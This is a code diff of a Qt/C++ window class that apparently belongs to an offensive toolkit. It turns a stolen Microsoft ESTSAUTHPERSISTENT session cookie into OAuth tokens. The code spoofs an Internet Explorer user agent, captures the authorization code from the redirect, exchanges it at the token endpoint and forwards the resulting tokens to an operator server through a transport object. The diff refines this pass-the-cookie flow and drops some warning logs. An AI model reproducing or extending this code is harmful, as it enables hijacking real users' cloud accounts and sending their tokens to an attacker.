@@ -6,9 +6,10 @@
 #include <QJsonDocument>
 #include <QJsonObject>
 #include <QUrl>
-#include <QDebug>
+#include <QUrlQuery>
 #include <QApplication>
 #include <QUuid>
+#include <QRegularExpression>
 
 SsoCookieTokenWindow::SsoCookieTokenWindow(QWidget* parent) : QWidget(parent) {
     setAttribute(Qt::WA_DeleteOnClose);
@@ -53,7 +54,9 @@ void SsoCookieTokenWindow::handleRequest() {
     QString clientId = clientIdInput->text().trimmed();
     QString domain = domainInput->text().trimmed();
     QString resource = resourceInput->text().trimmed();
-    QString cookie = cookieInput->toPlainText().trimmed();
+    // Remove ALL control characters and whitespace that break HTTP headers
+    QString cookie = cookieInput->toPlainText();
+    cookie.remove(QRegularExpression("[\\x00-\\x1F\\x7F\\s]"));
 
     if (clientId.isEmpty() || domain.isEmpty() || resource.isEmpty() || cookie.isEmpty()) {
         output->setText("[!] Missing input fields.");
@@ -63,94 +66,67 @@ void SsoCookieTokenWindow::handleRequest() {
     pendingClientId = clientId;
     pendingResource = resource;
     pendingCookie = cookie;
+    pendingDomain = domain;
 
-    resolveTenantId(domain);
+    output->append("[*] Requesting auth code...");
+    requestAuthCode();
 }
 
-void SsoCookieTokenWindow::resolveTenantId(const QString& domain) {
-    QUrl url(QString("https://login.microsoftonline.com/%1/.well-known/openid-configuration").arg(domain));
-    QNetworkRequest req(url);
+void SsoCookieTokenWindow::requestAuthCode() {
+    QString redirectUrl = getClientRedirectUrl(pendingClientId, pendingResource);
+
+    QString authUrlStr = QString("https://login.microsoftonline.com/%1/oauth2/v2.0/authorize"
+                                 "?redirect_uri=%2"
+                                 "&response_type=code"
+                                 "&scope=openid+offline_access"
+                                 "&response_mode=query"
+                                 "&client_id=%3")
+                             .arg(pendingDomain, redirectUrl, pendingClientId);
+
+    QNetworkRequest req{ QUrl(authUrlStr) };
+    req.setRawHeader("Host", "login.microsoftonline.com");
+    req.setRawHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
+    req.setRawHeader("Cookie", QByteArray("ESTSAUTHPERSISTENT=") + pendingCookie.toUtf8());
+    req.setAttribute(QNetworkRequest::RedirectPolicyAttribute, QNetworkRequest::ManualRedirectPolicy);
     NetworkHelper::setRequestTimeout(req);
-    QNetworkReply* reply = nam->get(req);
-    if (!reply) {
-        output->append("[!] Failed to create network request");
+
+    QNetworkReply* authReply = nam->get(req);
+    if (!authReply) {
+        output->append("[!] Failed to create auth request");
         return;
     }
 
-    connect(reply, &QNetworkReply::finished, [this, reply]() {
-        QByteArray data = reply->readAll();
-        reply->deleteLater();
-
-        QJsonDocument doc = QJsonDocument::fromJson(data);
-        if (!doc.isObject()) {
-            output->append("[!] Could not parse tenant discovery response.");
-            return;
-        }
-
-        QString authEndpoint = doc.object().value("authorization_endpoint").toString();
-        QString tenantId;
-        if (!authEndpoint.isEmpty()) {
-            QStringList parts = authEndpoint.split("/");
-            if (parts.size() > 3) tenantId = parts.at(3);
-        }
-
-        if (tenantId.isEmpty()) {
-            output->append("[!] Could not resolve tenant ID.");
-            return;
-        }
-
-        // Build auth code request
-        QString redirectUrl = getClientRedirectUrl(pendingClientId, pendingResource);
-
-        QString authUrl = QString("https://login.microsoftonline.com/%1/oauth2/v2.0/authorize"
-                                  "?redirect_uri=%2&response_type=code"
-                                  "&scope=openid+offline_access&response_mode=query&client_id=%3")
-                              .arg(tenantId, QUrl::toPercentEncoding(redirectUrl), pendingClientId);
-
-        QNetworkRequest req{ QUrl(authUrl) };
-        req.setRawHeader("Host", "login.microsoftonline.com");
-        req.setRawHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64)");
-        req.setRawHeader("Cookie", QByteArray("ESTSAUTHPERSISTENT=") + pendingCookie.toUtf8());
-        NetworkHelper::setRequestTimeout(req);
-        QNetworkReply* authReply = nam->get(req);
-        if (!authReply) {
-            output->append("[!] Failed to create auth request");
-            return;
-        }
-
-        connect(authReply, &QNetworkReply::finished, [this, authReply, tenantId, redirectUrl]() {
-            handleAuthReply(authReply);
-        });
+    connect(authReply, &QNetworkReply::finished, this, [this, authReply]() {
+        handleAuthReply(authReply);
     });
 }
 
 void SsoCookieTokenWindow::handleAuthReply(QNetworkReply* reply) {
     int status = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
-    QVariant locationHeader = reply->rawHeader("Location");
-    QByteArray data = reply->readAll();
+    QByteArray locationHeader = reply->rawHeader("Location");
     reply->deleteLater();
 
-    if (status == 302 && !locationHeader.isNull()) {
-        QUrl redirect(locationHeader.toString());
+    if (status == 302 && !locationHeader.isEmpty()) {
+        QUrl redirect(QString::fromUtf8(locationHeader));
         QString code = QUrlQuery(redirect).queryItemValue("code");
 
         if (!code.isEmpty()) {
-            output->append("[+] Auth code retrieved.\n");
-            QString tenantId = redirect.path().split("/").value(1); // fallback
+            output->append("[+] Auth code retrieved, exchanging for tokens...");
             QString redirectUrl = getClientRedirectUrl(pendingClientId, pendingResource);
-            exchangeCodeForToken(code, pendingClientId, tenantId, pendingResource, redirectUrl);
+            exchangeCodeForToken(code, pendingClientId, pendingDomain, pendingResource, redirectUrl);
             return;
         }
-        output->append("[!] Failed to extract auth code.");
+        output->append("[!] Failed to extract auth code from redirect.");
     } else {
-        output->append(QString("[!] Auth request failed. Status: %1").arg(status));
+        output->append(QString("[!] Auth request failed (status %1). Cookie may be invalid or expired.").arg(status));
     }
 }
 
 void SsoCookieTokenWindow::exchangeCodeForToken(const QString& code, const QString& clientId,
-                                                const QString& tenantId, const QString& resource,
+                                                const QString& domain, const QString& resource,
                                                 const QString& redirectUrl) {
-    QString tokenUrl = QString("https://login.microsoftonline.com/%1/oauth2/token").arg(tenantId);
+    // Use domain for token URL, same as Python
+    QString tokenUrl = QString("https://login.microsoftonline.com/%1/oauth2/token").arg(domain);
 
     QUrlQuery params;
     params.addQueryItem("client_id", clientId);
@@ -161,7 +137,9 @@ void SsoCookieTokenWindow::exchangeCodeForToken(const QString& code, const QStri
     params.addQueryItem("code", code);
 
     QNetworkRequest req{ QUrl(tokenUrl) };
-    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
+    req.setRawHeader("Host", "login.microsoftonline.com");
+    req.setRawHeader("Content-Type", "application/x-www-form-urlencoded");
+    req.setRawHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)");
     NetworkHelper::setRequestTimeout(req);
     QNetworkReply* reply = nam->post(req, params.toString(QUrl::FullyEncoded).toUtf8());
     if (!reply) {
@@ -169,7 +147,7 @@ void SsoCookieTokenWindow::exchangeCodeForToken(const QString& code, const QStri
         return;
     }
 
-    connect(reply, &QNetworkReply::finished, [this, reply]() {
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
         handleTokenReply(reply);
     });
 }
@@ -243,7 +221,6 @@ void SsoCookieTokenWindow::logTokenToServer(const QString &accessToken,
 
     QObject *transportObj = locateTransport();
     if (!transportObj) {
-        qWarning() << "[SsoCookie] Cannot log token: no transport found";
         return;
     }
 
@@ -268,5 +245,5 @@ void SsoCookieTokenWindow::logTokenToServer(const QString &accessToken,
         QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
     }
 
-    qDebug() << "[SsoCookie] Token logged to server for session:" << sessionId;
+    output->append("[+] Token logged to server.");
 }
